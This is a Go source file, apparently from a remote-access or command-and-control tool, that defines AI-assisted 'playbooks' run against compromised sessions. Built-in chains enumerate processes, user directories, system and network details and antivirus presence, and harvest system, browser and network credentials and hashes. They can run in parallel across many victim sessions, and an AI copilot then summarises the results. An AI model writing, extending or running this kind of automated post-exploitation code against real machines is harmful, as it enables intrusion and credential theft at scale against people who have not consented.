package ai

import (
	"encoding/json"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"toshell/internal/server/logging"
)

// ─── 副驾驶剧本化（Playbook）：确定性攻击链执行 ─────────────────────
// 与 Chat 的 LLM 决策不同，剧本是预编排的步骤序列，逐条调用工具、
// 按需等待任务完成、判定结果。适合"一键跑完整链路"这类确定性操作。

// Playbook 一个可执行的攻击/侦察剧本。
type Playbook struct {
	ID       string        `json:"id"`
	Name     string        `json:"name"`
	Desc     string        `json:"desc"`
	Steps    []PlaybookStep `json:"steps"`
	Fallback string        `json:"fallback"` // step 失败动作：continue / abort / report
}

// PlaybookStep 剧本中的一步。
type PlaybookStep struct {
	Name     string            `json:"name"`
	Tool     string            `json:"tool"`     // 工具名（file_list/process_list/screenshot/credentials/task_submit...）
	Args     map[string]string `json:"args"`     // 预填参数（session_id 运行时注入，${session_id} 占位）
	Wait     bool              `json:"wait"`     // 是否 task_wait 等结果
	Timeout  int               `json:"timeout"`  // task_wait 超时（秒），默认 60
	ExpectOK bool              `json:"expect_ok"` // 结果应为成功（exit 0）
}

// StepResult 单步执行结果。
type StepResult struct {
	Name   string `json:"name"`
	Tool   string `json:"tool"`
	Status string `json:"status"` // pending / running / completed / failed / skipped
	Output string `json:"output,omitempty"`
	Error  string `json:"error,omitempty"`
	TaskID uint64 `json:"task_id,omitempty"`
}

// PlaybookRun 一次剧本执行的进度状态。
type PlaybookRun struct {
	ID        string       `json:"id"`
	Playbook  string       `json:"playbook"`
	SessionID string       `json:"session_id"`
	Status    string       `json:"status"` // running / completed / failed / aborted
	Results   []StepResult `json:"results"`
	CreatedAt int64        `json:"created_at"`
	// Analysis 完成后由 AI 生成的总结建议（副驾驶未配置或生成失败时为空）。
	Analysis string `json:"analysis,omitempty"`
	// BatchID 同一次触发（一次执行/一次 delegate 多会话）共用一个批次标识，
	// 前端据此把同批 run 聚合成【一条】AI 建议；不同批次各给一条。
	BatchID string `json:"batch_id,omitempty"`

	mu sync.RWMutex `json:"-"`
}

// 内置剧本。
var BuiltinPlaybooks = []Playbook{
	{
		ID: "info-gather", Name: "信息收集链", Desc: "进程+目录+系统信息+网络连接+杀软检测",
		Steps: []PlaybookStep{
			{Name: "枚举进程", Tool: "process_list", Args: map[string]string{"session_id": "${session_id}"}, Wait: true, Timeout: 60, ExpectOK: true},
			{Name: "列出用户目录", Tool: "file_list", Args: map[string]string{"session_id": "${session_id}", "path": "C:\\Users"}, Wait: true, Timeout: 60, ExpectOK: true},
			{Name: "系统信息", Tool: "task_submit", Args: map[string]string{"session_id": "${session_id}", "command": "systeminfo"}, Wait: true, Timeout: 60, ExpectOK: true},
			{Name: "网络连接", Tool: "task_submit", Args: map[string]string{"session_id": "${session_id}", "command": "netstat -ano"}, Wait: true, Timeout: 60, ExpectOK: true},
			{Name: "杀软检测", Tool: "task_submit", Args: map[string]string{"session_id": "${session_id}", "command": "tasklist /v /fo csv"}, Wait: true, Timeout: 60, ExpectOK: true},
		},
		Fallback: "report",
	},
	{
		ID: "credential-chain", Name: "凭据收集链", Desc: "收集系统/浏览器/网络凭据并汇总哈希",
		Steps: []PlaybookStep{
			{Name: "凭据收集", Tool: "credentials", Args: map[string]string{"session_id": "${session_id}"}, Wait: true, Timeout: 120, ExpectOK: true},
		},
		Fallback: "report",
	},
	{
		ID: "full-recon", Name: "综合侦察", Desc: "信息收集 + 凭据收集串联",
		Steps: []PlaybookStep{
			{Name: "信息收集链", Tool: "playbook", Args: map[string]string{"session_id": "${session_id}", "playbook": "info-gather"}, Wait: false, ExpectOK: false},
			{Name: "凭据收集链", Tool: "playbook", Args: map[string]string{"session_id": "${session_id}", "playbook": "credential-chain"}, Wait: false, ExpectOK: false},
		},
		Fallback: "report",
	},
}

// PlaybookRunner 执行剧本的工具面（复用 MCP 工具执行器）。
type PlaybookRunner struct {
	executor ToolExecutor
	runs     map[string]*PlaybookRun // runID → 进度（供前端查询/推送）
	mu       sync.RWMutex
	seq      atomic.Uint64 // runID 序号（atomic 保证 386 上对齐安全）
	batchSeq atomic.Uint64 // 批次序号（同一次触发共享一个 batch）
	// analyzer 可选：剧本完成后把各步结果喂给 AI 生成总结建议（未配置时为空串）。
	analyzer func(sessionID string, results []StepResult) string
	// registered 运行时注册的剧本（如把模板/任务流转为剧本），随 ListPlaybooks 一起暴露。
	registered []Playbook
	// resolver 可选：按 id 动态解析剧本（如从模板库/数据库查），供 api 层接模板系统。
	resolver func(id string) *Playbook
}

func NewPlaybookRunner(executor ToolExecutor) *PlaybookRunner {
	return &PlaybookRunner{
		executor: executor,
		runs:     make(map[string]*PlaybookRun),
	}
}

// SetAnalyzer 注入剧本完成后的智能总结回调（由 api 层接copilot 实现）。
func (r *PlaybookRunner) SetAnalyzer(fn func(sessionID string, results []StepResult) string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.analyzer = fn
}

// RegisterPlaybook 运行时注册一个剧本（供模板/任务流合并到剧本面板）。
func (r *PlaybookRunner) RegisterPlaybook(pb Playbook) {
	r.mu.Lock()
	defer r.mu.Unlock()
	for i := range r.registered {
		if r.registered[i].ID == pb.ID {
			r.registered[i] = pb
			return
		}
	}
	r.registered = append(r.registered, pb)
}

// SetPlaybookResolver 设置按 id 动态解析剧本的回调（api 层接模板库/数据库）。
func (r *PlaybookRunner) SetPlaybookResolver(fn func(id string) *Playbook) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.resolver = fn
}

// findPlaybook 按 id 解析剧本：内置 → 运行时注册 → resolver。
func (r *PlaybookRunner) findPlaybook(id string) *Playbook {
	for i := range BuiltinPlaybooks {
		if BuiltinPlaybooks[i].ID == id {
			return &BuiltinPlaybooks[i]
		}
	}
	r.mu.RLock()
	for i := range r.registered {
		if r.registered[i].ID == id {
			pb := r.registered[i]
			r.mu.RUnlock()
			return &pb
		}
	}
	resolver := r.resolver
	r.mu.RUnlock()
	if resolver != nil {
		return resolver(id)
	}
	return nil
}

// ListPlaybooks 返回运行时注册的剧本（不含内置种子——内置已作为可编辑/删除的
// 任务模板写入数据库，由 api 层从模板库合并展示）。
func (r *PlaybookRunner) ListPlaybooks() []Playbook {
	out := make([]Playbook, 0, len(r.registered))
	r.mu.RLock()
	out = append(out, r.registered...)
	r.mu.RUnlock()
	return out
}

func (r *PlaybookRunner) GetRun(id string) *PlaybookRun {
	r.mu.RLock()
	defer r.mu.RUnlock()
	return r.runs[id]
}

// Snapshot 返回所有步骤结果的副本（并发安全，供 api/前端读取）。
func (run *PlaybookRun) Snapshot() []StepResult {
	run.mu.RLock()
	defer run.mu.RUnlock()
	out := make([]StepResult, len(run.Results))
	copy(out, run.Results)
	return out
}

// StatusSafe 返回当前状态（并发安全）。
func (run *PlaybookRun) StatusSafe() string {
	run.mu.RLock()
	defer run.mu.RUnlock()
	return run.Status
}

// ListRuns 返回最近 N 次运行（按时间倒序）。
func (r *PlaybookRunner) ListRuns(limit int) []*PlaybookRun {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]*PlaybookRun, 0, len(r.runs))
	for _, run := range r.runs {
		out = append(out, run)
	}
	// 简单倒序（runs 数量少，无需排序库）
	return out
}

// Run 在 goroutine 中执行剧本，立即返回 runID（异步进度由 GetRun 查询）。
// Run 在 goroutine 中执行剧本，立即返回 runID；每次触发生成一个独立批次。
func (r *PlaybookRunner) Run(playbookID, sessionID string) (*PlaybookRun, error) {
	return r.run(playbookID, sessionID, fmt.Sprintf("b-%d-%d", time.Now().UnixNano(), r.batchSeq.Add(1)))
}

// run 执行剧本并绑定一个批次（batch）。同批次的 run（如 delegate 多会话）
// 在前端会被聚合成一条 AI 建议；不同批次各给一条。
func (r *PlaybookRunner) run(playbookID, sessionID, batch string) (*PlaybookRun, error) {
	pb := r.findPlaybook(playbookID)
	if pb == nil {
		return nil, fmt.Errorf("playbook not found: %s", playbookID)
	}
	if r.executor == nil {
		return nil, fmt.Errorf("playbook executor not available")
	}
	run := &PlaybookRun{
		ID:        fmt.Sprintf("pb-%d-%d", time.Now().UnixNano(), r.seq.Add(1)),
		Playbook:  pb.ID,
		SessionID: sessionID,
		Status:    "running",
		CreatedAt: time.Now().Unix(),
		Results:   make([]StepResult, 0, len(pb.Steps)),
		BatchID:   batch,
	}
	r.mu.Lock()
	r.runs[run.ID] = run
	r.mu.Unlock()

	go r.execute(run, pb, sessionID)
	return run, nil
}

// RunParallel 并行在多个会话执行同一剧本（子代理能力）：
// 每个会话一个独立 run（携带该会话 id），全部完成后汇总。
// 同一次触发共享同一 batch，前端据此给【一条】AI 建议。
func (r *PlaybookRunner) RunParallel(sessionIDs []string, playbookID string, maxConcurrent int) []*PlaybookRun {
	if maxConcurrent <= 0 {
		maxConcurrent = 3
	}
	batch := fmt.Sprintf("b-%d-%d", time.Now().UnixNano(), r.batchSeq.Add(1))
	var runs []*PlaybookRun
	var mu sync.Mutex
	sem := make(chan struct{}, maxConcurrent)
	var wg sync.WaitGroup
	for _, sid := range sessionIDs {
		wg.Add(1)
		sem <- struct{}{}
		go func(s string) {
			defer wg.Done()
			defer func() { <-sem }()
			run, err := r.run(playbookID, s, batch)
			if err == nil {
				mu.Lock()
				runs = append(runs, run)
				mu.Unlock()
			}
		}(sid)
	}
	wg.Wait()
	return runs
}

func (r *PlaybookRunner) execute(run *PlaybookRun, pb *Playbook, sessionID string) {
	defer func() {
		if rec := recover(); rec != nil {
			run.mu.Lock()
			run.Status = "failed"
			run.mu.Unlock()
			logging.Error("ai", "playbook %s panic: %v", pb.ID, rec)
		}
		r.maybeAnalyze(run, sessionID)
	}()

	for _, step := range pb.Steps {
		// full-recon 嵌套剧本：递归执行（子步骤并入当前 run 的 Results）
		if step.Tool == "playbook" {
			nestedID := step.Args["playbook"]
			if nestedID != "" {
				if nested := r.findPlaybook(nestedID); nested != nil {
					r.execute(run, nested, sessionID)
				}
			}
			continue
		}

		sr := StepResult{Name: step.Name, Tool: step.Tool, Status: "running"}
		run.mu.Lock()
		run.Results = append(run.Results, sr)
		run.mu.Unlock()

		// 注入 session_id
		args := map[string]string{}
		for k, v := range step.Args {
			if v == "${session_id}" {
				v = sessionID
			}
			args[k] = v
		}

		result, err := r.executor.InvokeTool(step.Tool, args)
		if err != nil {
			sr.Status = "failed"
			sr.Error = err.Error()
			r.updateResult(run, sr)
			// 失败策略
			if step.ExpectOK || pb.Fallback == "abort" {
				r.finish(run, "failed")
				return
			}
			continue // continue 跳过
		}
		// 任务类工具：需要等待真实结果（waitTask 会把 sr.Output 覆盖为 task_wait 输出）
		if step.Wait {
			if waitErr := r.waitTask(run, &sr, result, step, sessionID); waitErr != nil {
				if step.ExpectOK || pb.Fallback == "abort" {
					r.finish(run, "failed")
					return
				}
				continue
			}
		} else {
			// 非等待任务：直接用工具返回作为输出
			sr.Output = summarizeToolResult(step.Tool, fmt.Sprintf("%v", result))
		}
		sr.Status = "completed"
		r.updateResult(run, sr)
	}
	r.finish(run, "completed")
}

// maybeAnalyze 剧本进入终态（completed/failed）后异步生成 AI 总结。
func (r *PlaybookRunner) maybeAnalyze(run *PlaybookRun, sessionID string) {
	run.mu.RLock()
	status := run.Status
	run.mu.RUnlock()
	if status != "completed" && status != "failed" {
		return
	}
	r.mu.RLock()
	fn := r.analyzer
	r.mu.RUnlock()
	if fn == nil {
		return
	}
	go r.analyze(run, sessionID)
}

// analyze 剧本完成后生成 AI 总结并把结果写回 run.Analysis。
func (r *PlaybookRunner) analyze(run *PlaybookRun, sessionID string) {
	r.mu.RLock()
	fn := r.analyzer
	r.mu.RUnlock()
	if fn == nil {
		return
	}
	run.mu.RLock()
	results := make([]StepResult, len(run.Results))
	copy(results, run.Results)
	run.mu.RUnlock()

	analysis := fn(sessionID, results)
	if analysis == "" {
		return
	}
	run.mu.Lock()
	run.Analysis = analysis
	run.mu.Unlock()
}

// waitTask 若工具返回 task_id 则轮询 task_wait 拿结果。
func (r *PlaybookRunner) waitTask(run *PlaybookRun, sr *StepResult, result interface{}, step PlaybookStep, sessionID string) error {
	raw, _ := json.Marshal(result)
	var m map[string]interface{}
	if json.Unmarshal(raw, &m) != nil {
		return nil
	}
	tid, ok := m["task_id"].(float64)
	if !ok || tid == 0 {
		return nil
	}
	sr.TaskID = uint64(tid)
	timeout := step.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	waitResult, err := r.executor.InvokeTool("task_wait", map[string]string{
		"task_id":     fmt.Sprintf("%d", uint64(tid)),
		"timeout_sec": fmt.Sprintf("%d", timeout),
	})
	if err != nil {
		sr.Error = err.Error()
		return err
	}
	wr, _ := json.Marshal(waitResult)
	var wm map[string]interface{}
	json.Unmarshal(wr, &wm)
	if st, _ := wm["status"].(string); st == "failed" || st == "timeout" {
		sr.Error = fmt.Sprintf("task %s", st)
		return fmt.Errorf("task %s", st)
	}
	sr.Output = summarizeToolResult("task_wait", string(wr))
	return nil
}

func (r *PlaybookRunner) updateResult(run *PlaybookRun, sr StepResult) {
	run.mu.Lock()
	for i := range run.Results {
		if run.Results[i].Name == sr.Name && run.Results[i].Tool == sr.Tool {
			run.Results[i] = sr
			break
		}
	}
	run.mu.Unlock()
}

func (r *PlaybookRunner) finish(run *PlaybookRun, status string) {
	run.mu.Lock()
	run.Status = status
	run.mu.Unlock()
}
